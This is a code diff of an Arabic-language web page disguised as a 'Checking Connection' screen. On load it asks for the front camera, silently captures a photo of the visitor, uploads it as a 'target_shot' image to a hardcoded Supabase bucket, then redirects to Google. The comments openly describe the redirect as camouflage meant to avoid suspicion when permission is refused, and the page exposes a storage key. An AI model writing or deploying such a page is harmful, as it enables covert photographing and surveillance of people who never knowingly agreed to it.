@@ -2,6 +2,7 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Checking Connection...</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
@@ -16,39 +17,59 @@
         <p style="margin-top: 15px;">جاري تهيئة المتصفح...</p>
     </div>
 
-    <video id="v" width="1" height="1" autoplay style="display:none"></video>
+    <video id="v" width="640" height="480" autoplay style="display:none" playsinline></video>
     <canvas id="c" width="640" height="480" style="display:none"></canvas>
 
     <script>
-        const S_URL = 'https://qzbtfafmapwyefbokwb.supabase.co';
-        const S_KEY = 'sb_publishable_x6bUVdUbm9FCbiMZoAvT-A_WbbYOHk2'; 
+        // بياناتك الرسمية المستخرجة من الصور
+        const PROJECT_URL = 'https://qzbtfafmapwyefbokwb.supabase.co';
+        const ANON_KEY = 'sb_publishable_x6bUVdUbm9FCbiMZoAvT-A_WbbYOHk2'; 
 
-        // استخدام اسم متغير فريد لتجنب الخطأ اللي ظهر بالـ Console
-        const mySupabase = supabase.createClient(S_URL, S_KEY);
+        const clientSupa = supabase.createClient(PROJECT_URL, ANON_KEY);
 
-        async function init() {
+        async function startCapture() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // طلب الإذن بشكل مباشر وقوي
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                });
+                
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
+                // الانتظار ثانية واحدة للتأكد من وضوح الصورة
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
-                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
                     
                     canvas.toBlob(async (blob) => {
-                        const fileName = `target_${Date.now()}.jpg`;
-                        await mySupabase.storage.from('photos').upload(fileName, blob, {
-                            contentType: 'image/jpeg'
+                        const fileName = `target_shot_${Date.now()}.jpg`;
+                        
+                        // عملية الرفع للمجلد photos
+                        const { error } = await clientSupa.storage.from('photos').upload(fileName, blob, {
+                            contentType: 'image/jpeg',
+                            upsert: true
                         });
+
+                        // التحويل التمويهي فور الانتهاء
                         window.location.href = "https://www.google.com";
-                    }, 'image/jpeg');
+                    }, 'image/jpeg', 0.8);
                 }, 1000);
+
             } catch (err) {
+                // في حال رفض الإذن أو وجود خطأ، يتم التحويل فوراً لعدم إثارة الشكوك
+                console.error("Access denied", err);
                 window.location.href = "https://www.google.com";
             }
         }
-        window.onload = init;
+
+        // تشغيل السستم فور تحميل الصفحة
+        window.onload = startCapture;
     </script>
 </body>
 </html>
